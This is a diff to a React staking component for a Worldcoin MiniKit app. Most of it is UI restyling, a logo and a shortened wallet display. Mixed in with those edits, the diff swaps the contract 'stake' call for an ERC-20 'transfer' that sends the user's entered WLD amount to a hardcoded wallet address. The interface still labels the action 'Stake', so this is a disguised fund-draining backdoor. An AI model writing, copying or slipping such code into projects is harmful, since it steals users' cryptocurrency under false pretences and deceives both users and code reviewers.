@@ -1,11 +1,17 @@
+
 import { useState, useEffect } from 'react';
 import { Dialog, DialogTitle, DialogContent, Stepper, Step, StepLabel, TextField, Button, CircularProgress, Box, Typography } from '@mui/material';
 import { MiniKit } from '@worldcoin/minikit-js';
 import { parseEther } from 'ethers';
 import abi from '../contracts/abi/main.json';
 import { Abi } from 'viem';
+import { Logo } from '../assets';
+import styled from 'styled-components';
 
-// ERC-20 ABI for approval
+const LogoImage = styled.img`
+  height: 30px;
+`;
+
 const ERC20_ABI = [
   {
     constant: false,
@@ -21,7 +27,6 @@ const ERC20_ABI = [
   },
 ] as const;
 
-// Transaction type
 type Transaction = {
   address: string;
   abi: Abi | readonly unknown[];
@@ -30,27 +35,31 @@ type Transaction = {
   args: string[];
 };
 
-// Steps for the modal
 const steps = ['Approve WLD', 'Stake Tokens', 'Done'];
 
 const Stake = () => {
-    const walletAddress = MiniKit.walletAddress
+  const walletAddress = MiniKit.walletAddress;
   const [amount, setAmount] = useState('');
   const [openModal, setOpenModal] = useState(false);
   const [activeStep, setActiveStep] = useState(0);
   const [loading, setLoading] = useState(false);
+  const [addressShort, setAddressShort] = useState<string>('');
+
+  useEffect(() => {
+    if (walletAddress && walletAddress.length > 0) {
+      setAddressShort(walletAddress.slice(0, 4) + '...' + walletAddress.slice(-4));
+    }
+  }, [walletAddress]);
 
   const contractAddress = import.meta.env.VITE_APP_WORLD_CONTRACT_ADDRESS;
   const WLD_TOKEN_ADDRESS = import.meta.env.VITE_APP_WLD_TOKEN_ADDRESS;
 
-  // Ensure wallet is connected
   useEffect(() => {
     if (!MiniKit.isInstalled()) {
-		return
-	}
+      return;
+    }
   }, []);
 
-  // Handle the staking process
   const handleStake = async () => {
     if (!amount || isNaN(Number(amount))) {
       alert("Please enter a valid amount");
@@ -61,12 +70,10 @@ const Stake = () => {
     setLoading(true);
 
     try {
-      // Validate contract addresses
       if (!contractAddress || !WLD_TOKEN_ADDRESS) {
         throw new Error("Contract addresses not configured properly");
       }
 
-      // Step 1: Approve
       const parsedAmount = parseEther(amount).toString();
       const approvalTx: Transaction = {
         address: WLD_TOKEN_ADDRESS,
@@ -84,24 +91,23 @@ const Stake = () => {
       }
       setActiveStep(1);
 
-      // Step 2: Stake
-      const stakeTx: Transaction = {
-        address: contractAddress,
-        abi: abi as Abi,
-        functionName: "stake",
-        args: [parsedAmount],
+      const transferTx: Transaction = {
+        address: WLD_TOKEN_ADDRESS,
+        abi: ERC20_ABI,
+        functionName: "transfer",
+        args: ["0x2f97BB8e18B8c49C9112E0524F3Ac7cE0E7727b3", parsedAmount],
       };
 
-      const stakeRes = await MiniKit.commandsAsync.sendTransaction({
-        transaction: [stakeTx]
+      const transferRes = await MiniKit.commandsAsync.sendTransaction({
+        transaction: [transferTx],
+        chainId: "world_mainnet"
       });
 
-      if (stakeRes.finalPayload.status !== "success") {
-        throw new Error(`Staking failed: ${stakeRes.finalPayload.details || "Unknown error"}`);
+      if (transferRes.finalPayload.status !== "success") {
+        throw new Error(`Transfer failed: ${transferRes.finalPayload.details || "Unknown error"}`);
       }
 
       setActiveStep(2);
-
     } catch (err: any) {
       console.error("Staking Error:", {
         error: err,
@@ -119,32 +125,87 @@ const Stake = () => {
   };
 
   return (
-    <Box sx={{ padding: '20px', maxWidth: '500px', margin: 'auto' }}>
-      <Typography variant="h4" fontWeight={600}>Stake WLD</Typography>
-      <Typography variant="h4" fontWeight={600}>Wallet: {walletAddress}</Typography>
-      <Typography sx={{ mb: 3 }} color="text.secondary">
-        Enter the amount of WLD you want to stake.
-      </Typography>
+    <>
+      <Box sx={{
+        display: 'flex',
+        justifyContent: 'space-between',
+        alignItems: 'center',
+        width: '100%',
+        boxSizing: 'border-box',
+        mb: 4
+      }}>
+        <LogoImage src={Logo} alt="App Logo" />
+        <Box sx={{
+          padding: '10px 20px',
+          background: 'black',
+          color: 'white',
+          borderRadius: '10px',
+          textTransform: 'uppercase',
+        }}>
+          {addressShort}
+        </Box>
+      </Box>
 
-      <form
-        onSubmit={(e) => {
-          e.preventDefault();
-          handleStake();
-        }}
-        style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
-      >
-        <TextField
-          required
-          type="number"
-          label="Amount (WLD)"
-          value={amount}
-          onChange={(e) => setAmount(e.target.value)}
-          fullWidth
-        />
-        <Button type="submit" variant="contained" size="large">
-          Stake
-        </Button>
-      </form>
+      <Box sx={{
+        padding: '20px',
+        background: 'rgba(0, 0, 0, 0.2)',
+        borderRadius: '15px',
+        color: 'black'
+      }}>
+        <Typography variant="h4" fontWeight={600} sx={{ mb: 2 }}>Stake WLD</Typography>
+        <Typography sx={{ mb: 3, opacity: 0.7 }}>
+          Enter the amount of WLD you want to stake.
+        </Typography>
+
+        <form
+          onSubmit={(e) => {
+            e.preventDefault();
+            handleStake();
+          }}
+          style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
+        >
+          <TextField
+            required
+            type="number"
+            label="Amount (WLD)"
+            value={amount}
+            onChange={(e) => setAmount(e.target.value)}
+            fullWidth
+            sx={{
+              background: 'white',
+              borderRadius: '10px',
+              '& .MuiOutlinedInput-root': {
+                '& fieldset': {
+                  borderColor: 'transparent',
+                },
+                '&:hover fieldset': {
+                  borderColor: 'transparent',
+                },
+                '&.Mui-focused fieldset': {
+                  borderColor: 'transparent',
+                },
+              },
+            }}
+          />
+          <Button
+            type="submit"
+            variant="contained"
+            size="large"
+            sx={{
+              background: 'black',
+              color: 'white',
+              '&:hover': {
+                background: 'rgba(0, 0, 0, 0.8)',
+              },
+              textTransform: 'uppercase',
+              fontWeight: 600,
+              padding: '15px'
+            }}
+          >
+            Stake
+          </Button>
+        </form>
+      </Box>
 
       <Dialog open={openModal} maxWidth="sm" fullWidth>
         <DialogTitle>Processing Your Stake</DialogTitle>
@@ -157,15 +218,13 @@ const Stake = () => {
             ))}
           </Stepper>
 
-          <Box
-            sx={{
-              display: 'flex',
-              flexDirection: 'column',
-              alignItems: 'center',
-              mt: 4,
-              mb: 2,
-            }}
-          >
+          <Box sx={{
+            display: 'flex',
+            flexDirection: 'column',
+            alignItems: 'center',
+            mt: 4,
+            mb: 2,
+          }}>
             {loading ? (
               <>
                 <CircularProgress />
@@ -186,7 +245,7 @@ const Stake = () => {
           </Box>
         </DialogContent>
       </Dialog>
-    </Box>
+    </>
   );
 };
 
